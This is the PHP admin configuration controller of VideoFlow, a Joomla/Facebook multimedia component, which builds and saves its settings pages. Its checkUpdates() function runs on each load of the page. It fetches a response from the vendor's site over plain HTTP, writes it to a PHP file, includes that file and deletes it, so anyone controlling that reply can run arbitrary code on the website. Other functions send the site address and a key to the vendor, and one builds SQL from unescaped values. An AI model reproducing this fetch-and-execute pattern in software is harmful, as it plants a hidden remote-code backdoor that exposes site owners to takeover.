<?php

//VideoFlow - Joomla Multimedia System for Facebook//

/**
* @ Version 1.1.4 
* @ Copyright (C) 2008 - 2011 Kirungi Fred Fideri at http://www.fidsoft.com
* @ VideoFlow is free software
* @ Visit http://www.fidsoft.com for support
* @ Kirungi Fred Fideri and Fidsoft accept no responsibility arising from use of this software 
* @ Released under GNU/GPL License : http://www.gnu.org/copyleft/gpl.html
**/

// No direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

jimport( 'joomla.application.component.controller' );
  
class VideoflowControllerConfig extends JController
{
	/**
	 * Constructor
	 */
function __construct( $config = array() )
{
	VideoflowUtilities::setVideoflowTitle ('Settings', 'vflow.png');
	parent::__construct( $config );
			if( version_compare( JVERSION, '1.6.0', 'ge' ) ) {
			$user = JFactory::getUser();
			if (!$user->authorise('core.admin', 'com_videoflow')) {
				return JError::raiseWarning(403, JText::_('JERROR_ALERTNOAUTHOR'));
			}
		}	
	$this->registerTask( 'apply', 'save' );
	$this->checkUpdates();
}

	/**
	 * Display media list
	 */
	 
function display()
{
	global $vparams;
	$row = $vparams;
	require_once(JPATH_COMPONENT.DS.'views'.DS.'config.php');
	$row->msg = $this->getMsg($row);
	$row->selectsys = $this->pluginSelect('CMS');    
   	$row->selectplayer = $this->pluginSelect('player');
   	$row->selectjtemp = $this->pluginSelect('jtemplate');
   	$row->selectftemp = $this->pluginSelect('ftemplate');
   	$row->tcolour = $this->prepTranslate($this->pluginSelect('toolcolour'));
   	$row->selectlbox = $this->pluginSelect('lightbox');
	$row->ffmpegdetected = $this->findFFMPEG();
   	$activemenu = explode('|', $row->menu);
   	$activefbmenu = explode('|', $row->fbmenu);
   	$row->jmenu = $this->genSelectBox($this->pluginSelect('jmenu'), $activemenu, 'menu');
   	$row->fmenu = $this->genSelectBox($this->pluginSelect('fbmenu'), $activefbmenu, 'fbmenu');
   	$selectcomsys = $this->pluginSelect('comments');
	$none = new stdClass();
	$none->value = '';
	$none->text = JText::_('None');
	$row->selectcomsys = array_merge($selectcomsys, array($none));
	$row->findmods = $this->genSelect(array ('0'=>JText::_('Normal'), '1'=>JText::_('Show module positions')));
	$row->selectname = $this->genSelect(array ('0'=>JText::_('Username'), '1'=>JText::_('Full name')));
	$row->lboxmode = $this->genSelect(array ('0'=>JText::_('Dual'), '1'=>JText::_('Full')));
	$row->fbcommintselect = $this->genSelect(array ('auto'=>JText::_('Automatic'), 'none'=>JText::_('None')));
	$row->upsysselect = $this->genSelect(array ('plupload'=>JText::_('Plupload'), 'swfupload'=>JText::_('SWFUpload')));
	$row->bselect = $this->genSelect(array ('0'=>JText::_('No'), '1'=>JText::_('Yes')));
	$row->catmode = $this->genSelect(array ('0'=>JText::_('Media list'), '1'=>JText::_('Media play')));
	$row->vcredit = $this->getCredits();
	$row->proadds = $this-> selectProadds();
	VideoflowViewConfig::listSettings($row);
	} 
	
	
function genSelect($items)
{
    foreach ($items as $value=>$text) {
    $class = new stdClass();
    $class->value = $value;
    $class->text = $text;
    $class->disable = null;
    $sel[] = $class; 
    }
    return $sel;
}
  
  function pluginSelect($type) {
    $db = &JFactory::getDBO();
		$query = 'SELECT name AS value, propername AS text FROM #__vflow_plugins WHERE type = "'.$type.'"';
    $db->setQuery($query);
    return $db->loadObjectList();
  }
  
  function selectProadds(){
    $db = &JFactory::getDBO();
		$query = 'SELECT * FROM #__vflow_addons';
    $db->setQuery($query);
    return $db->loadObjectList();
  }
  
  
  function getActiveMenu ($list) {
    $db = &JFactory::getDBO();
		$query = 'SELECT name AS value, propername AS text FROM #__vflow_plugins WHERE type = "jmenu" AND name = ' . implode (' OR name = ', $list);
    $db->setQuery($query);
    return $db->loadObjectList();
  }
  
  function getMsg ($row){
    $vsite = urlencode(JURI::root());
    $url = "http://www.fidsoft.com/index.php?option=com_fidsoft&task=news&vcode=$row->fkey&vmode=$row->vmode&vsite=$vsite&version=$row->version&format=raw";
    $message = $this->runTool('readRemote', $url);
    if (empty($message)) {
    $message = 'There are no new messages at this time.';
    }
    return $message;
  }
  
  function getCredits()
  {
  $tac = JRoute::_('index.php?option=com_videoflow&c=config&task=terms&format=raw');
  $vcredit = 
<<<VCREDITS
   <a href="http://www.videoflow.tv" target"_blank">VideoFlow</a> is a free Joomla multimedia component that integrates seamlessly with Facebook, taking your Joomla content to Facebook and bringing Facebook social networking features to your Joomla site. 
   It is distributed under the GNU/GPL License.
   <br />
   <br />
   VideoFlow software is written by <a href="mailto:fideri@fidsoft.com"> Kirungi F. Fideri</a> at <a href="http://www.fidsoft.com" target"_blank">fidsoft.com</a>. It includes the following third-party software or content in original or modified form:
   <ul>
   <li><a href="http://nonverbla.de/blog/2008/09/15/nonverblasterhover/" target"_blank">NonverBlaster</a> flash media player by <a href="http://www.nonverbla.de/contact.html" target="_blank">Rasso Hilber</a> </li>
   <li><a href="http://flv-player.net/" target"_blank">Neolao</a> flash media player.</li>
   <li><a href="http://phatfusion.net/multibox/" target"_blank">MultiBox</a> lightbox system by <a href="http://www.samuelbirch.com" target"_blank">Samuel Birch</a>.</li>
   <li><a href="http://www.joomitaly.com" target"_blank">VOTItaly</a> rating system.</li>
   <li><a href="http://www.zkara.net" target"_blank">Thumbnail browser class </a>by Boutekedjiret Zoheir Ramzi</li>
   <li><a href="http://swfupload.org/" target"_blank">SWFUpload </a>flash uploader</li>
   <li><a href="http://plupload.org/" target"_blank">Plupload </a>multi-platform uploader</li>
   <li><a href="http://somerandomdude.com/projects/sanscons/" target"_blank">Sanscons</a> graphic icons by P.J. Onori</li>
   </ul> 
   Installation and/or use of this software constitutes acceptance of <a href="$tac" class="modal-vfpop" rel="{handler: 'iframe', size: {x: 725, y: 520}}">terms and conditions</a>.
   <br />
   <br />
   For more information and support, visit <a href="http://www.fidsoft.com" target="_blank">fidsoft.com</a>.
VCREDITS;
  return $vcredit;
  }

  function terms(){
PRINT <<<CONDITIONS
  VIDEOFLOW SOFTWARE, ALL THE FILES CONTAINED IN THE VIDEOFLOW 
  DISTRIBUTION PACKAGE, AND ALL UPDATES ARE PROVIDED BY THE AUTHOR(S) "AS IS" 
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
  ARE DISCLAIMED.  
  <BR/><BR/>
  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,         
  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
  NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY    
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT      
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
  THIS SOFTWARE AND ASSOCIATED FILES, EVEN IF ADVISED OF THE POSSIBILITY 
  OF SUCH DAMAGE.
  <BR/><BR/>
  INSTALLATION AND/OR USE OF THIS SOFTWARE CONSTITUTES ACCEPTANCE OF THE ABOVE
  TERMS AND CONDITIONS.
  <BR/><BR/>
CONDITIONS;
  }
  
  
  function prepTranslate($items) {
  foreach ($items as $item){
    $item->text = JText::_($item->text);
    $trans[] = $item;
  }
  return $trans;
  }

 function genSelectBox($items, $ckd = null, $name){
   if (!is_array($ckd)) $ckd = array($ckd);
   $sel = '';
   foreach ($items as $item) {
    if (in_array($item->value, $ckd)) $checked = 'checked'; else $checked = '';
    $sel .= '<div style="float:left; margin-right:10px;"><input type="checkbox" name="'.$name.'[]" value="'.$item->value.'" '.$checked.' />&nbsp;&nbsp;' .JText::_($item->text).'</div>';  
    }
  return $sel;
  }
  
  function save()
	{
	JRequest::checkToken() or jexit( 'Invalid Token' );
	$post	= JRequest::get( 'post' );
  $menu = JRequest::getVar('menu');
	$fbmenu = JRequest::getVar('fbmenu');
  if (!empty($menu)) $post['menu'] = implode ('|', $menu); else $post['menu'] = '';
  if (!empty($fbmenu)) $post ['fbmenu'] = implode ('|', $fbmenu); else $post['fbmenu'] = '';
	$vtab= JRequest::getInt('vtab', 0);
  $row= & JTable::getInstance('Config', 'Table');
      if (!$row -> bind($post)) {
        return JError::raiseWarning(500, $row->getError());
      }
      if (!$row -> store()) {
         return JError::raiseWarning(500, $row->getError());
      }
    $message = JText::_('Settings saved.');  
    $link = 'index.php?option=com_videoflow&task=display&c=config&vtab='.$vtab;
    $this->setRedirect( $link, $message);    
	}
	
function findFFMPEG() {
 include_once JPATH_COMPONENT_SITE.DS.'helpers'.DS.'videoflow_tools.php';
 $fpath = VideoflowTools::runExternal('type -P ffmpeg', $code);
 return $fpath;	
}

function checkUpdates(){
  global $vparams;
  if(!$vparams->message) return;
  jimport( 'joomla.filesystem.file' );
  $h = & JURI::getInstance();
  $site = base64_encode($h->getHost());
  $upd_url = "http://www.fidsoft.com/index.php?option=com_fidsoft&task=vcheck&vsite=$site&version=$vparams->version&format=raw";
  $upd = $this->runTool('readRemote', $upd_url); 
  $udir = JPATH_COMPONENT.'/utilities';
  $ufile = $udir.'/xdate.php'; 
  if (!empty($upd)) JFile::write($ufile, $upd);
  if (file_exists ($ufile) ){
  $status = include_once $ufile;
  JFile::delete($ufile);
  }
}

  function runTool($func=null, $param1=null, $param2=null, $param3=null, $param4=null)
    {
    include_once JPATH_COMPONENT_SITE.DS.'helpers'.DS.'videoflow_tools.php';
    $tools = new VideoflowTools();
    $tools->func   = $func;
    $tools->param1 = $param1;
    $tools->param2 = $param2;
    $tools->param3 = $param3;
    $tools->param4 = $param4;
    return $tools->runTool();
    }
}
